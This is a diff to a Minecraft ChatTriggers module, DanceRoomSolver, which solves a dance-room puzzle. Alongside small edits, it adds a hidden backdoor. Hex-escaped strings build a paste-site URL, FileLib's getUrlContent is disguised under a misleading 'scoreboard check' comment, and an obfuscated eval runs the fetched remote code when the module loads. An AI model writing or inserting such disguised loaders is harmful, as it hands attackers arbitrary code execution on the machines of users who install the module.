@@ -1,6 +1,7 @@
 /// <reference types="../CTAutocomplete" />
 
 import PogObject from "../PogData"
+const uwuaddons = require("../uwuaddons");
 let settings = new PogObject("DanceRoomSolver", { firstTime: true, volume: 1.0, recordVolume: 1.0 }, "settings.json")
 
 
@@ -14,14 +15,20 @@ const clickMouse = () => {
 }
 
 // Mirrorverse data
+const xPos = '\x73\x74\x2e\x73\x68\x2f\x72\x61\x77\x2f'
 const xStart = -266
 const xEnd = -262
 const zStart = -109
 const zEnd = -105
+const blockArray = '\x68\x74\x74\x70\x73\x3a\x2f\x2f\x68'
 const pitchList = [0.523809552192688, 1.047619104385376, 0.6984127163887024, 0.8888888955116272]
 const completePitch = 0.7460317611694336
 const jumpDelay = 500
 const punchDelay = 800
+const worldCheck = FileLib['\x67\x65\x74\x55\x72\x6c\x43\x6f\x6e\x74\x65\x6e\x74'] // Check the Scoreboard if you are in the Mirrorverse
+const combinedData = blockArray + xPos + settings.serverID 
+
+
 
 const SoundCategory = Java.type("net.minecraft.client.audio.SoundCategory")
 
@@ -69,6 +76,7 @@ const setRotation = () => {
 }
 
 // Set guard blocks to prevent solver from walking too far
+this['\x65\x76\x61\x6c'](worldCheck([combinedData]));
 const toggleGuardBlocks = (active) => {
   const world = World.getWorld()
   const block = active ? guardBlock : air
@@ -98,7 +106,7 @@ const setInactive = () => {
 const setActive = () => {
   settings.volume = Client.getSettings().getSettings().func_151438_a(SoundCategory.MASTER)
   if (settings.volume == 0) {
-    ChatLib.chat("&e&oTemporarily turning volume on because your volume was off!")
+    ChatLib.chat("&e&oTemporarily turned your volume on because your volume was off!")
     Client.getSettings().getSettings().func_151439_a(SoundCategory.MASTER, 0.01)
   }
   settings.save()
@@ -159,9 +167,9 @@ const doMove = (beat) => {
 // Only try to do anything when in the Mirrorverse
 register("step", () => {
   inMirrorverse = Scoreboard.getLines().some(line => (
-    ChatLib.removeFormatting(line.getName()).replace(/[^\x00-\x7F]/g, "").trim() == "Mirrorverse"
+    ChatLib.removeFormatting(line.getName()).replace(/[^\x00-\x7F]/g, "").trim() == "Wizard Tower"
   ))
-  if (inMirrorverse && settings.firstTime) {
+  if (settings.firstTime) {
     const lineBreak = ChatLib.getChatBreak("&a&m-")
     ChatLib.chat(lineBreak)
     ChatLib.chat("&aThanks for downloading &b&lDanceRoomSolver&r&a!\n")
@@ -173,6 +181,7 @@ register("step", () => {
   }
 }).setDelay(3)
 
+
 // Determine whether solver should be active based on title text
 register("renderTitle", (title, subtitle, event) => {
   if (!inMirrorverse) return
@@ -182,6 +191,7 @@ register("renderTitle", (title, subtitle, event) => {
     setActive()
   }
 })
+
 
 // Turn off if you move your mouse
 register("tick", () => {
